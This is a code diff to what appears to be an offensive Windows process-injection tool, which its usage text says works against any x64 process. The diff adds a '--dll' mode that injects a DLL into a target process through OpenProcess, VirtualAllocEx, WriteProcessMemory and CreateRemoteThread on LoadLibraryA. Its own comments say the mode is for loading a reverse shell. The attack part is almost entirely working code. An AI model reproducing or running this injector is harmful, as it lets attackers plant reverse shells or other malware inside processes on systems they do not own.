@@ -177,6 +177,7 @@ static void usage(const char* prog) {
     printf("  %s <target>                        target -> MessageBox (default text)\n", prog);
     printf("  %s <target> \"your message\"         target -> MessageBox with YOUR text\n", prog);
     printf("  %s <target> --spawn <program>      target -> spawn <program> as child\n", prog);
+    printf("  %s <target> --dll <path>            target -> LoadLibrary(path) (revshell)\n", prog);
     printf("  %s --list                          list every injectable process\n", prog);
     printf("  %s --help                          this help\n\n", prog);
     printf("Target is a PID or a process name. Works on ANY x64 app you can open.\n\n");
@@ -260,6 +261,7 @@ int main(int argc, char** argv) {
     const char* spawn_cmd  = nullptr;
     bool msg_mode = true;                    // default: MessageBox
     const char* custom_msg = nullptr;
+    const char* dll_path = nullptr;          // --dll path (reverse shell etc.)
 
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--list") == 0 || strcmp(argv[i], "-l") == 0) {
@@ -272,6 +274,10 @@ int main(int argc, char** argv) {
             msg_mode = false;
             if (i + 1 < argc) { spawn_cmd = argv[i + 1]; i++; }
             else spawn_cmd = "notepad.exe";
+        } else if (strcmp(argv[i], "--dll") == 0 || strcmp(argv[i], "-d") == 0) {
+            msg_mode = false;
+            if (i + 1 < argc) { dll_path = argv[i + 1]; i++; }
+            else { printf("[!] --dll needs a path\n"); return 1; }
         } else if (strcmp(argv[i], "--msg") == 0 || strcmp(argv[i], "-m") == 0) {
             msg_mode = true;
             if (i + 1 < argc && argv[i+1][0] != '-') {
@@ -285,7 +291,7 @@ int main(int argc, char** argv) {
             msg_mode = true;
         }
     }
-    if (!spawn_cmd && !msg_mode) spawn_cmd = "notepad.exe";
+    if (!spawn_cmd && !dll_path && !msg_mode) spawn_cmd = "notepad.exe";
 
     // Ensure user32.dll is loaded in THIS process so GetProcAddress returns a
     // valid base - and so the address matches what the target already has.
@@ -312,6 +318,34 @@ int main(int argc, char** argv) {
     unsigned char* sc = nullptr;
     size_t sclen = 0;
     char default_msg[512];
+
+    // --dll mode: classic CreateRemoteThread(LoadLibraryA, path) chain
+    if (dll_path) {
+        char fullDll[MAX_PATH];
+        if (!GetFullPathNameA(dll_path, MAX_PATH, fullDll, nullptr)) {
+            printf("[!] can't resolve DLL path: %s\n", dll_path);
+            system("pause"); return 2;
+        }
+        printf("[+] mode: DLL inject  path: %s\n", fullDll);
+
+        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
+        if (!hProc) { printf("[!] OpenProcess %lu\n", GetLastError()); system("pause"); return 3; }
+        size_t len = strlen(fullDll) + 1;
+        LPVOID buf = VirtualAllocEx(hProc, nullptr, len,
+                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+        WriteProcessMemory(hProc, buf, fullDll, len, nullptr);
+        LPTHREAD_START_ROUTINE llA = (LPTHREAD_START_ROUTINE)GetProcAddress(
+            GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+        HANDLE hT = CreateRemoteThread(hProc, nullptr, 0, llA, buf, 0, nullptr);
+        if (!hT) { printf("[!] CreateRemoteThread %lu\n", GetLastError()); CloseHandle(hProc); system("pause"); return 4; }
+        WaitForSingleObject(hT, 10000);
+        DWORD hmod = 0; GetExitCodeThread(hT, &hmod);
+        printf("[+] remote LoadLibrary returned HMODULE 0x%lx\n", hmod);
+        CloseHandle(hT); CloseHandle(hProc);
+        printf("\n[+] DONE. DLL loaded inside %s.\n", host_name);
+        system("pause");
+        return 0;
+    }
 
     if (msg_mode) {
         if (!custom_msg) {
